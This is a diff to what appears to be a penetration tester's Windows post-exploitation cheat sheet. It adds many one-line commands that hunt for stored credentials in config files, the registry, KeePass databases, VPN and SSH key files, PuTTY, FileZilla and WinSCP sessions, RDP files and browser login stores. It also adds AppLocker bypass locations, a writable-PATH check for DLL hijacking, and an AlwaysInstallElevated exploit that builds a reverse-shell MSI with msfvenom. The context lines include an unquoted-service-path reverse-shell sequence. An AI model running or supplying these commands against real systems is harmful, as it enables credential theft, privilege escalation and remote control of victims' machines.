@@ -84,6 +84,7 @@ loot:gci C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.l
 loot:Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "<user>", "<user>", "<user>" # recursive sensitive-file keyword hunting outside Windows directory (configs, creds, names); target-machine
 loot:Get-ChildItem -Path C:\ -Recurse -Force -Include *.xml,*.bak,*.txt,*.ps1,*.log,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows|C:\\Program Files\\|C:\\ProgramData\\' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "<user>", "<user>", "<user>" # aggressive credential and user-string search excluding common system directories; target-machine
 loot:powershell.exe -c "Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows\\' } | Select-String -Pattern 'pwd=', 'password=', 'username=', 'user=', 'pass=', '<user>', '<user>', '<user>'" # non-interactive PowerShell credential hunting (useful for RCE/exec contexts); target-machine
+loot:powershell.exe -c "gci C:\Users,C:\ProgramData -Recurse -Force -File -EA 0 -Include .config,.ini,.xml,.bak,.txt,.ps1,.log,.json,.yml,.yaml,.env,.rdp,*.kdbx | sls -SimpleMatch -Pattern 'pwd=','password=','pass=','username=','user=','svc_apache','svc_mssql'" # shorter credential-hunting sweep (reduced paths + extensions) to avoid tight command-length limits; target-machine
 loot:Get-ChildItem -Recurse -Filter *.xml | Select-String -Pattern 'password|pass' # quick XML-only secret grep; target-machine
 loot:Get-ChildItem -Path '<filename1>' -Include *.ps1*,*.txt*,*.exe*,*.log*,*.ini*,*.kdbx*,*.pdf*,*.xls*,*.xlsx*,*.doc*,*.docx* -File -Recurse -ErrorAction SilentlyContinue # loot sweep by extension under a path; target-machine
 loot:Get-ChildItem '<filename1>' -File -Force -ErrorAction SilentlyContinue | Where-Object { $*.Extension -match '.(php|txt|ini|config|xml|ps1|bat|cmd)$' } | Select-String -SimpleMatch -CaseSensitive:$false -Pattern 'Password:', 'password', 'pwd', 'pass' | Format-Table Path, LineNumber, Line -AutoSize # targeted secret grep in common config/script extensions; target-machine
@@ -105,6 +106,16 @@ loot:for /r C:\ %f in (*.txt *.ini *.kdbx *.xml *.config) do @echo [LOOT] %f & f
 loot:reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" # extract autologon username/domain/password if present; target-machine
 loot:reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password" # registry grep for password strings (cmd); target-machine
 loot:Get-ItemProperty HKLM:\SOFTWARE* -Recurse -EA 0 | findstr /i "password token secret" | select -First 200 # quick registry scrape for secret-like strings; target-machine
+loot:dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*autounattend*.xml C:\*Unattend*.xml C:\*Panther* 2>nul # find all unattend files; target-machine
+loot:findstr /si password C:\*.xml | findstr /i "PlainText Password" # search for passwords in XML files; target-machine
+loot:Get-ChildItem -Path C:\ -Recurse -Force -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.kdbx,*.rdp -ErrorAction SilentlyContinue | Select-String -Pattern "password=|pwd=|pass=|credentials=" | Select Path,LineNumber,Line -First 100 | Format-Table -Wrap # find all files with passwords; target-machine
+loot:Get-ChildItem -Path C:\ -Recurse -Force -Filter "*.kdbx" -ErrorAction SilentlyContinue | % { $_.FullName } # find all .kdbx (KeePass) files; target-machine
+loot:Get-ChildItem -Path C:\Users\ -Recurse -Force -Filter "*.rdg" -ErrorAction SilentlyContinue | % { $_.FullName } # find all .rdg (Remote Desktop Gateway Manager) files; target-machine
+loot:Get-ChildItem -Path C:\ -Recurse -Force -Include "*.ovpn", "*.pcf", "*.pbk" -ErrorAction SilentlyContinue | % { $_.FullName } # find all VPN configuration files; target-machine
+loot:Get-ChildItem -Path C:\ -Recurse -Force -Include "*.pem", "*.key", "*.ppk", "*.pfx", "*.p12" -ErrorAction SilentlyContinue | % { $_.FullName } # find all private keys; target-machine
+loot:Get-ChildItem -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue | % { $_.PSChildName; Get-ItemProperty $_.PSPath } # check for PuTTY saved sessions; target-machine
+loot:Get-ChildItem -Path "C:\Users\*\AppData\Roaming\FileZilla\*.xml" -Recurse -ErrorAction SilentlyContinue | % { $_.FullName } # check for FileZilla saved passwords; target-machine
+loot:Get-ChildItem -Path "C:\Users\*\AppData\Local\VirtualStore\Program Files (x86)\WinSCP\WinSCP.ini" -ErrorAction SilentlyContinue | % { $_.FullName } # check for WinSCP saved passwords; target-machine
 find windows loot in kali-machine:find / -type f ( -iname *.txt* -o -iname *.log* -o -iname *.ps1* -o -iname *.exe* -o -iname *.ini* -o -iname *.kdbx* -o -iname *.pdf* -o -iname *.xls* -o -iname *.xlsx* -o -iname *.doc* -o -iname *.docx* ) 2>/dev/null # broad loot sweep across a mounted/downloaded filesystem; kali-machine
 find windows loot in kali-machine:find / -type f ( -iname "*.txt" -o -iname "*.log" -o -iname "*.ps1" -o -iname "*.exe" -o -iname "*.ini" -o -iname "*.kdbx" -o -iname "*.pdf" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.doc" -o -iname "*.docx" ) 2>/dev/null | sed 200q # same loot sweep but capped output to avoid flooding terminal; kali-machine
 reg:reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # inspect SNMP service config/community strings; target-machine
@@ -189,3 +200,19 @@ Unquoted Service Path #2:sc.exe config <service> binPath= "<payload_full_path>" 
 Unquoted Service Path #2:sc.exe qc <service> #verify updated service configuration and binPath; target-machine
 Unquoted Service Path #2:penelope <kaliPort> #start listener on Kali to catch reverse shell; kali-machine
 Unquoted Service Path #2:sc.exe start <service> #start service to trigger execution of malicious payload; target-machine
+Credential Manager (list):cmdkey /list # list stored Windows credentials; target-machine
+Credential Manager (vault):vaultcmd /listcreds:"Windows Credentials" /all # list Windows Vault credentials; target-machine
+Credential Manager (vaultcmd tool):.\vaultcmd.exe /listcreds:"Windows Credentials" /all # run vaultcmd from tools; target-machine
+AppLocker (view policy):Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections # view AppLocker policy; target-machine
+AppLocker (detailed view):Get-AppLockerPolicy -Effective | ConvertFrom-AppLockerPolicy | % {$_.RuleCollections} # detailed view; target-machine
+AppLocker (detailed view):# Common bypass locations: C:\Windows\Temp, C:\Windows\Tasks, C:\Windows\System32\spool\drivers\color
+AlwaysInstallElevated Check (machine):reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul # check machine policy; target-machine
+AlwaysInstallElevated Check (user):reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul # check user policy; target-machine
+AlwaysInstallElevated Exploit (create MSI):msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f msi -o <filename1>.msi # create malicious MSI; kali-machine
+AlwaysInstallElevated Exploit (install MSI):msiexec /quiet /qn /i <filename1>.msi # install MSI (elevates to SYSTEM if AlwaysInstallElevated set); target-machine
+Writable PATH Check:for %A in ("%PATH:;=" "%") do (@if exist "%~A" (@icacls "%~A" 2>nul | findstr /i "(F) (M) (W)" && echo [WRITABLE] %~A)) # find writable PATH directories for DLL hijacking; target-machine
+Browser Passwords (Chrome locate):dir C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data /s /b # locate Chrome login data; target-machine
+Browser Passwords (Firefox locate):dir C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json /s /b # locate Firefox logins; target-machine
+RDP Files (find):dir C:\Users\*\Documents\Default.rdp /s /b # find RDP connection files; target-machine
+RDP Files (view):type C:\Users\<user>\Documents\Default.rdp # view RDP connection settings; target-machine
+RDP Files (search creds):findstr /i "username password" C:\Users\*\Documents\*.rdp 2>nul # search RDP files for creds; target-machine
